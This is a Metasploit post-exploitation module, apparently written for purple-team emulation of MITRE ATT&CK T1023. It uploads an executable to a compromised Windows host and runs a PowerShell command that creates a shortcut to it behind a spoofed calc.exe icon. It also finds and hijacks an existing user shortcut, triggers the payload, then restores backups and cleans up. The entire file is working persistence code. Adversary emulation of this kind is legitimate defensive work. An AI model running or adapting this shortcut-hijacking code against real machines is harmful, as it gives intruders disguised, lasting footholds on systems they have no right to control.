##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Purple
  include Msf::Post::Windows::Powershell
  include Msf::Post::File
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
                      'Name'          => 'Shortcut Modification (T1023) Windows - Purple Team',
                      'Description'   => %q{
                        Persistence:
                        Shortcuts or symbolic links are ways of referencing other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process. Adversaries could use shortcuts to execute their tools for persistence. They may create a new shortcut as a means of indirection that may use Masquerading to look like a legitimate program. Adversaries could also edit the target path or entirely replace an existing shortcut so their tools will be executed instead of the intended legitimate program.},
                      'License'       => MSF_LICENSE,
                      'Author'        => [ 'Praetorian' ],
                      'References'    => [ [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1023' ] ],
                      'Platform'      => [ 'win' ],
                      'SessionTypes'  => [ 'meterpreter' ]
                     ))
    register_options(
    [
      OptBool.new("CLEANUP", [ true, "Remove both the source and destination.", true]),
      OptString.new("METHOD", [true, "1=Create a new shortcut, 2=Modify an existing shortcut, 0=Both", "0"]),
      OptString.new("EXE", [true, "Target EXE to run via shortcut.", Msf::Config.data_directory + "/purple/t1023/t1023.exe"]),
      OptString.new("TARGET_LNK", [false, "Target shortcut to modify via Method 2.", ""]),
      OptString.new("TARGET_ICON", [true, "EXE path of icon on host to spoof.", "C:\\Windows\\System32\\calc.exe"]),
      OptString.new("DESCRIPTION", [ true, "Description.", 'Shortcut Modification (T1023) - Praetorian Purple Team']),
    ])
  end

  def run
    begin
      raise "Module requires meterpreter session" unless session.type == "meterpreter"

      print_status("Killing existing instances of calc.exe")
      kill_calc

      # upload EXE payload to host
      local_file_path = datastore['EXE']
      remote_file_path = "C:\\t1023.exe"
      print_status("Uploading #{local_file_path} to #{remote_file_path}")
      upload_file(remote_file_path, local_file_path)

      shortcut = ("C:\\t1023.lnk")

      case datastore['METHOD']
      when '0'
        t1023_create(shortcut)
        t1023_modify()
      when '1'
        t1023_create(shortcut)
      when '2'
        t1023_modify()
      else
        raise "Invalid method option provided."
      end

      # cleanup handled in individual methods
      print_good("Module T1023W execution successful.")
    rescue ::Exception => e
      print_error("#{e.class}: #{e.message}")
      print_error("Module T1023W execution failed.")
    end
  end


  def t1023_create(shortcut)
  #
  # Create LNK file referencing "C:\\t0123.exe" via powershell, run it and check for output.
  #
    print_status("Creating new shortcut...") unless datastore['METHOD'] == '2'

    # command creates a new LNK file that points to our persistence payload
    cmd = "$shell = New-Object -COM WScript.Shell; $shortcut = $shell.CreateShortcut(\"#{shortcut}\"); $shortcut.TargetPath = \"C:\\t1023.exe\"; $shortcut.IconLocation = \"#{datastore['TARGET_ICON']}\"; $shortcut.Description = \"#{datastore['DESCRIPTION']}\"; $shortcut.Save();"
    # execute the psh command on host to create LNK
    print_status("Loading PowerShell")
    client.run_cmd("load powershell")
    print_status("Executing #{cmd} on #{session.inspect}")
    client.run_cmd("powershell_execute '#{cmd}'")

    # execute the lnk
    print_status("Triggering persistence...")
    run_cmd("\"#{shortcut}\"")

    sleep(3)

    # check for success (is calc running, was a persistence file created?)
    if file_exist?("C:\\t1023.txt")
      print_good("Found persistence file!")
    else
      print_warning("Unable to find persistence file. Execution may have failed.")
    end

    if datastore['CLEANUP']
      register_files_for_cleanup((datastore['METHOD'] == '2' ? "" : shortcut), "C:\\t1023.txt", datastore['EXE'])
      kill_calc(true)
    end
  end


  def t1023_modify()
  #
  # Modify an existing LNK file to point to our payload, run it, check for output.
  #
    print_status("Modifying existing shortcut...")

    target_lnk = datastore['TARGET_LNK']
    if target_lnk.nil? or target_lnk.empty?
      print_status("No target shortcut provided. Searching for LNKs...")
      shortcuts = client.fs.file.search("C:\\Users\\", ".lnk")
      if not shortcuts.empty?
        target_lnk = shortcuts[0]['path'] + '\\' + shortcuts[0]['name']
      else
        raise 'Unable to find LNK to modify'
      end
    end

    # backup
    backup = "C:\\Windows\\TEMP\\t1023.bak"
    print_status("Backing up #{target_lnk} to #{backup}")
    write_file(backup, read_file(target_lnk))

    # do this to prevent "creating new" print...
    datastore['METHOD'] = '2'
    print_status("Modifying #{target_lnk}")
    t1023_create(target_lnk)


    # restore backup
    print_status("Restoring backup")
    write_file(target_lnk, read_file(backup))
    register_files_for_cleanup("C:\\Windows\\TEMP\\t1023.bak")
    register_files_for_cleanup("C:\\t1023.exe")
  end
end
